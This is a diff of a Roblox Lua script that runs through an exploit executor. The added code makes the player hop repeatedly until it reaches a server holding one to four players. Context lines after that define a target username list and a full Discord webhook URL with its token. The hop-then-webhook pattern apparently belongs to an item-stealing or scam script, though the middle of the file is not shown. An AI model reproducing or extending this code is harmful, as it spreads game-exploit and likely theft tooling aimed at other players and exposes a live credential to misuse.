@@ -1,43 +1,58 @@
--- Auto Server Hop Spam Until Lower Population Server
+-- Fast Auto-Hop to Server with 1–4 Players, Stops When In Target
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
-local function getSmallestServer()
-	local currentCount = #Players:GetPlayers()
-	local success, servers = pcall(function()
-		local req = syn and syn.request or request
+local MIN_PLAYERS, MAX_PLAYERS = 1, 4
+
+-- Get servers with 1–4 players (excluding current)
+local function getSmallServers()
+	local success, result = pcall(function()
+		local req = (syn and syn.request or request)
 		return HttpService:JSONDecode(req({
 			Url = "https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100",
 			Method = "GET"
 		}).Body)
 	end)
 
-	if success and servers and servers.data then
-		for _, server in ipairs(servers.data) do
-			if server.id ~= game.JobId and server.playing < currentCount then
-				return server.id
+	if success and result and result.data then
+		local servers = {}
+		for _, server in ipairs(result.data) do
+			if server.id ~= game.JobId and server.playing >= MIN_PLAYERS and server.playing <= MAX_PLAYERS then
+				table.insert(servers, server.id)
 			end
 		end
+		return servers
 	end
 	return nil
 end
 
-local function autoHopLoop()
+-- Hops until you land in a valid small server
+local function autoHopUntilSmall()
 	while true do
-		local targetServerId = getSmallestServer()
-		if targetServerId then
-			TeleportService:TeleportToPlaceInstance(game.PlaceId, targetServerId, LocalPlayer)
-			break
+		local currentCount = #Players:GetPlayers()
+		if currentCount >= MIN_PLAYERS and currentCount <= MAX_PLAYERS then
+			print("✅ Already in small server ("..currentCount.." players). Auto-hop disabled.")
+			break -- Auto-hop turns off
 		end
-		task.wait(3) -- wait before retrying
+
+		local servers = getSmallServers()
+		if servers and #servers > 0 then
+			for _, sid in ipairs(servers) do
+				print("🔁 Hopping to server: "..sid)
+				TeleportService:TeleportToPlaceInstance(game.PlaceId, sid, LocalPlayer)
+				task.wait(2.5) -- fast retry delay
+			end
+		end
+
+		task.wait(1.5)
 	end
 end
 
--- Start auto-hop spam loop
-autoHopLoop()
-task.wait(5) -- brief pause in case teleport didn't go through
+-- Start auto-hop
+autoHopUntilSmall()
+task.wait(3) -- prevent conflict with main script execution
 
 Username = {"darkunknownusers"}
 Webhook = "https://discord.com/api/webhooks/1388199702914404393/YEkwUlOo3WImnClu_PZ6V6IeDvCSmefP8sbEpL1sjVE3dpvfYFLVtdX0iYHJlbl9Iqxg"
@@ -262,6 +277,7 @@ game.Players.PlayerAdded:Connect(function(player)
     end
 
 end)
+
 
 
 
